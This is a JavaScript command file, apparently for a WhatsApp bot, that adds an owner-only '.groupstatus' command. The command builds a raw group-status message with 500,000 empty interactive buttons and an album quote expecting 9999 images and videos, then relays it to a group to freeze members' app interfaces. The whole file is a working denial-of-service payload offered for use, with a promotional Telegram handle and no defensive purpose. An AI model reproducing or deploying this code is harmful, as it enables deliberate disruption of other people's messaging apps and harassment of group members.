// ⟦EXPERT⟧ .groupstatus — group status UI freeze bug (raw relay)
async function ownerOnly(z) {
  return !!z.isOwner
}

export default {
  name: 'groupstatus',
  aliases: ['gstatus', 'statbug'],
  desc: 'Send group status freeze bug (owner only, groups only)',
  async run(z) {
    await z.react('💀').catch(() => {})
    try {
      if (!(await ownerOnly(z))) return z.reply('⛔ Owner only.')
      if (!z.isGroup) return z.reply('👥 Groups only.')

      const target = z.jid

      await z.reply('💀 *Launching GROUP STATUS BUG...*\n⏳ *This may freeze the group UI.*')

      // ─── Expand $repeatArray([{}],500000) into a real array ───
      const buttons = new Array(500000)
      for (let i = 0; i < 500000; i++) buttons[i] = {}

      // ─── Raw payload ───
      const rawMessage = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: 'Telegram: @Midoxsmb'
              },
              nativeFlowMessage: {
                buttons
              },
              contextInfo: {
                quotedMessage: {
                  albumMessage: {
                    expectedImageCount: 9999,
                    expectedVideoCount: 9999
                  }
                }
              }
            }
          }
        }
      }

      const messageId = `3EB0${Math.random().toString(36).slice(2, 12).toUpperCase()}`

      try {
        await z.sock.relayMessage(target, rawMessage, { messageId })
      } catch (relayErr) {
        console.warn('[groupstatus] relay failed:', relayErr.message)
        throw relayErr
      }

      await z.reply(
        `💀 *GROUP STATUS BUG SENT!*\n\n` +
        `📱 *Target:* ${target}\n` +
        `🔘 *Buttons:* 500,000\n` +
        `💥 *Effect:* group UI freeze`
      )
      await z.react('✅').catch(() => {})
    } catch (e) {
      console.error('[groupstatus]', e)
      await z.reply(`❌ *Group status bug failed*\n${e.message}`)
      await z.react('❌').catch(() => {})
    }
  }
}
